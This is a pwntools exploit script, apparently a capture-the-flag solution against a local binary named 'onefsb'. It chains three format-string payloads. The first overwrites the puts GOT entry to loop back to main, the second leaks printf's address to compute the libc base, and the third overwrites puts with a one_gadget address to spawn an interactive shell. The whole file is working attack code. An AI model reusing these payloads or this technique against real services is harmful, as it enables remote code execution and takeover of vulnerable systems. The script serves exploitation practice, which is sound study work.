from pwn import *

# conn = process('./onefsb')
conn = remote('127.0.0.1', 61234)
elf = ELF('./onefsb')
libc = ELF('./libc.so.6')
# pwnlib.gdb.attach(proc.pidof(conn)[0])
# gdb.attach(conn)
context(arch = 'amd64', os='linux', log_level='DEBUG')

# First payload: hijacking control flow
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
printf_got = elf.got['printf']
printf_offset = libc.symbols['printf']
main_addr = 0x4011fd 
payload = fmtstr_payload(6,{puts_got:main_addr},write_size="short")
conn.sendlineafter(b"what's your message: ", payload)
# conn.interactive()

# Second payload: leaking libc address
payload2 = b'%7$sKKKK' + p64(printf_got)
conn.sendlineafter(b"what's your message: ", payload2)
recv = conn.recvuntil(b'KKKK')
recv = recv.strip(b'KKKK')
recv = recv.ljust(8,b'\0')
printf_addr = u64(recv)
libc_addr = printf_addr - printf_offset
log.success("printf_addr => 0x{:016X}".format(printf_addr))
log.success("libc_addr   => 0x{:016X}".format(libc_addr))
# conn.interactive()


# Third payload: getting system shell
pop_rdi_addr = 0x000000000002a3e5 + libc_addr
bin_sh_addr = next(libc.search('/bin/sh')) + libc_addr
system_addr = libc.symbols['system'] + libc_addr
one_gadget = 0xebc85 + libc_addr
payload3 = fmtstr_payload(6,{puts_got:one_gadget})
conn.sendlineafter(b"what's your message: ", payload3)
conn.interactive()
